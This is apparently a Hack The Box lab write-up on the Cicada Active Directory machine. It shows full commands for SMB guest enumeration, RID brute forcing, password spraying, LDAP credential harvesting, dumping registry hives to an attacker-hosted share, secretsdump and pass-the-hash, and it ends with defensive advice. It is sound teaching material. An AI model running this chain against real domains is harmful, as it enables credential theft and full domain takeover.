---
title: "Cicada: Active Directory Credential Chaining via Guest SMB Access"
description: "Guest SMB, LDAP attributes, and embedded script credentials chain into Backup Operators hive extraction and domain compromise."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - credential-chaining
---

## Summary

Cicada is an Easy Windows Active Directory machine on Hack The Box. Guest SMB access exposes an onboarding notice containing a default password. Password spraying identifies a valid domain account. LDAP description fields leak a second credential pair. A development share reveals a backup script embedding a third. The final user holds `Backup Operators` group membership, enabling SAM and SYSTEM hive extraction from the domain controller and recovery of an administrative NTLM hash. The attack chain demonstrates how several low-severity misconfigurations compound into full domain compromise.

## Context and Objective

The target is a Windows Server 2022 Active Directory Domain Controller. The objective is to obtain administrative access on the domain controller by chaining credential disclosures across SMB shares, LDAP attributes, and embedded script credentials. The exercise is conducted in a controlled Hack The Box lab environment; target-specific identifiers are replaced with role-based placeholders.

## Approach and Evidence

### Stage 1 — Port Scanning and Service Identification

A port scan reveals standard Active Directory services and identifies the host as a domain controller:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

The combination of DNS (53), Kerberos (88), LDAP (389/636/3268/3269), and WinRM (5985) confirms a domain controller. SMB signing is enabled and required.

### Stage 2 — Guest SMB Access and HR Share Disclosure

SMB guest access is accepted. Enumerating shares with null credentials shows the `<ONBOARDING_SHARE>` share is readable:

```bash
nxc smb <DOMAIN_FQDN> -u 'a' -p '' --shares
```

```text
Share     Permissions  Remark
-----     -----------  ------
ADMIN$                 Remote Admin
C$                     Default share
<DEVELOPMENT_SHARE>
<ONBOARDING_SHARE> READ
IPC$      READ         Remote IPC
NETLOGON               Logon server share
SYSVOL                 Logon server share
```

Spidering the onboarding share downloads a notice containing a default password for new hires:

```text
Your default password is: <DEFAULT_PASSWORD>
```

This password is not tied to a specific username. The next step is domain user discovery.

### Stage 3 — RID Brute Forcing and Password Spraying

RID brute forcing via SMB with guest access returns the domain user list:

```bash
nxc smb <DOMAIN_FQDN> -u 'a' -p '' --rid-brute \
  | awk '/SidTypeUser/' \
  | awk '{print $6}' \
  | awk -F'\\' '{print $2}' > users.txt
```

```text
<DOMAIN_ADMINISTRATOR>
<GUEST_ACCOUNT>
<KERBEROS_SERVICE_ACCOUNT>
<DOMAIN_CONTROLLER_MACHINE_ACCOUNT>
<DOMAIN_USER_1>
<DOMAIN_USER_2>
<INITIAL_DOMAIN_USER>
<INTERMEDIATE_DOMAIN_USER>
<REMOTE_ACCESS_USER>
```

Spraying the default onboarding password across all discovered users confirms validity for `<INITIAL_DOMAIN_USER>`:

```bash
nxc smb <DOMAIN_FQDN> \
  -u users.txt \
  -p '<DEFAULT_PASSWORD>' \
  --continue-on-success
```

```text
SMB  <TARGET_IP>  445  <DOMAIN_CONTROLLER>  [+] <DOMAIN_FQDN>\<INITIAL_DOMAIN_USER>:<DEFAULT_PASSWORD>
```

### Stage 4 — LDAP Description Credential Leak

With valid credentials for `<INITIAL_DOMAIN_USER>`, an LDAP query on user description fields reveals a plaintext credential for `<INTERMEDIATE_DOMAIN_USER>`:

```bash
nxc ldap <DOMAIN_FQDN> \
  -u '<INITIAL_DOMAIN_USER>' \
  -p '<DEFAULT_PASSWORD>' \
  -M get-desc-users
```

```text
User: <INTERMEDIATE_DOMAIN_USER> description: <INTERMEDIATE_USER_CREDENTIAL>
```

### Stage 5 — DEV Share Credential Disclosure

Authenticating as `<INTERMEDIATE_DOMAIN_USER>` grants read access to the development share, which contains a PowerShell backup script. The script embeds credentials for `<REMOTE_ACCESS_USER>`:

```powershell
$username = "<REMOTE_ACCESS_USER>"
$password = ConvertTo-SecureString "<EMILY_CREDENTIAL>" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
```

Validating these credentials confirms access to the `ADMIN$` share (read) and `C$` share (read/write), along with WinRM access on port 5985.

### Stage 6 — WinRM Access and Backup Operators Membership

WinRM access as `<REMOTE_ACCESS_USER>` provides an interactive shell. Group membership inspection shows membership in both `Remote Management Users` and `Backup Operators`:

```text
memberof : {
  CN=Remote Management Users,CN=Builtin,DC=<DOMAIN_COMPONENT>,
  CN=Backup Operators,CN=Builtin,DC=<DOMAIN_COMPONENT>
}
```

`Remote Management Users` explains the WinRM access. `Backup Operators` is the privilege escalation path: members can read protected files for backup purposes, including registry hives on a domain controller.

### Stage 7 — Backup Operators Hive Dump and Administrator Access

The Backup Operators privilege is abused to extract the SAM and SYSTEM hives from the domain controller:

```bash
impacket-smbserver share . -smb2support
```

```powershell
.\<BACKUP_OPERATOR_TOOL> -t \\<DOMAIN_CONTROLLER_FQDN> -o \\<ATTACKER_IP>\<SHARE_NAME>\
```

```text
Dumping SAM hive to \\<ATTACKER_IP>\share\SAM
Dumping SYSTEM hive to \\<ATTACKER_IP>\share\SYSTEM
```

Offline extraction of the administrative NTLM hash from the recovered hives:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

```text
[*] Target system bootKey: <BOOT_KEY>
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)

<DOMAIN_ADMINISTRATOR>:500:<LM_HASH>:<ADMIN_NTLM_HASH>:::
```

Pass-the-hash authentication with the recovered administrative NTLM hash yields full domain administrative access:

```bash
evil-winrm -i <DOMAIN_FQDN> \
  -u <DOMAIN_ADMINISTRATOR> \
  -H <ADMIN_NTLM_HASH>
```

## Challenges and Decisions

The primary challenge was not technical complexity but recognizing the credential chain. Each stage required a different technique (guest enumeration, LDAP attribute querying, share spidering, script analysis, registry hive extraction), and the link between stages was always a credential disclosure in an unexpected location — an HR notice, an LDAP description, and a backup script. The default HR password applied only to one user out of several, requiring a spray to identify the valid account rather than assuming a 1:1 mapping.

## Outcome

The exercise demonstrates full domain compromise through five chained credential disclosures:

1. Guest SMB → onboarding default password
2. Default password → `<INITIAL_DOMAIN_USER>` (password spray)
3. `<INITIAL_DOMAIN_USER>` → `<INTERMEDIATE_DOMAIN_USER>` (LDAP description leak)
4. `<INTERMEDIATE_DOMAIN_USER>` → `<REMOTE_ACCESS_USER>` (development-share backup script)
5. `<REMOTE_ACCESS_USER>` → `<DOMAIN_ADMINISTRATOR>` (Backup Operators hive dump)

No single misconfiguration is critical in isolation. The compound effect of guest access, stale credentials, credential leakage in directory attributes, plaintext credentials in scripts, and over-privileged backup rights results in complete domain takeover.

## Lessons and Recommendations

- **Disable guest/null SMB access.** Guest access should not be available on production domain controllers. Regularly audit which shares are accessible without authentication.
- **Enforce immediate default password rotation.** Onboarding documents containing default passwords should trigger automatic forced password change during account provisioning. Default passwords that remain valid after first login create a persistent spray target.
- **Sanitize AD description fields.** User description fields are readable by any authenticated domain user. Credentials, notes, or sensitive strings in these fields are effectively shared secrets. Monitor and restrict writes to directory attributes.
- **Eliminate plaintext credentials in scripts.** The backup script embedded a password in plaintext. Use managed service accounts (gMSA), Windows Credential Manager, or a secret management solution instead of embedded credentials.
- **Restrict Backup Operators membership.** Members of `Backup Operators` can read protected system files. Do not combine this privilege with interactive remote login rights (WinRM) unless operationally required and separately monitored.
- **Monitor for credential spraying patterns.** A single password attempted across multiple accounts is a detectable indicator. Implement alerting for repeated authentication failures across a user list.

## References

- Hack The Box — [Cicada](https://app.hackthebox.com/machines/Cicada) machine.
- MITRE ATT&CK: T1078 (Valid Accounts), T1552.006 (Credentials In Files), T1003.002 (Security Account Manager).
